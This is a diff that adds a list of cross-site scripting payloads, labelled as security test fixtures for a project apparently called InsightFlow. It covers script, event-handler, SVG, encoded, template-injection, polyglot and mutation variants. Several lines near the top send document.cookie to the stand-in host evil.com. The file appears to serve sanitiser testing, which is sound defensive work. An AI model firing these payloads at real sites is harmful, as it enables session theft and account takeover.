@@ -1,0 +1,80 @@
+# XSS Payloads - InsightFlow Security Test Fixtures
+# Format: one payload per line, # for comments
+
+# Basic script injection
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>
+<script>new Image().src='http://evil.com/steal?'+document.cookie</script>
+
+# Event handlers
+<img src=x onerror=alert(1)>
+<img src=x onerror=document.location='http://evil.com'>
+<img src=x onerror=fetch('http://evil.com/'+document.cookie)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<svg onload=alert(1)>
+<marquee onstart=alert(1)>
+<div onmouseover=alert(1)>Hover me</div>
+
+# JavaScript pseudo-protocol
+<a href="javascript:alert(1)">Click</a>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+
+# SVG-based XSS
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><use href="data:image/svg+xml,<script>alert(1)</script>">
+
+# Attribute-based
+" onfocus=alert(1) autofocus
+" onmouseover=alert(1)
+' onfocus=alert(1) autofocus
+' - alert(1) - '
+" autofocus onfocus=alert(1) x="
+
+# Encoded variants
+&#60;script&#62;alert(1)&#60;/script&#62;
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+\u003cscript\u003ealert(1)\u003c/script\u003e
+
+# CSS injection
+<div style="width:expression(alert(1))">
+<style>body{background-image:url('javascript:alert(1)')}</style>
+<div style="background:url('javascript:alert(1)')">
+
+# DOM-based XSS
+#"><img src=x onerror=alert(1)>
+#<img src=x onerror=alert(1)>
+</script><script>alert(1)</script>
+<</script><script>alert(1)</script>
+
+# Angular / template injection
+{{constructor.constructor('alert(1)')()}}
+{{7*7}}
+{$on.constructor('alert(1)')()}
+
+# Polyglot XSS
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
+
+# Mutation XSS
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<select><option><style></select><script>alert(1)</script>
+
+# XSS via headers
+User-Agent: <script>alert(1)</script>
+Referer: <script>alert(1)</script>
+Cookie: <script>alert(1)</script>
+
+# XSS in JSON
+{"name": "<script>alert(1)</script>"}
+{"url": "javascript:alert(1)"}
+
+# Self-XSS variants
+'"><img src=x onerror=alert(1)>
+""><img src=x onerror=alert(1)>
+'';!--"<XSS>=&{()}
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
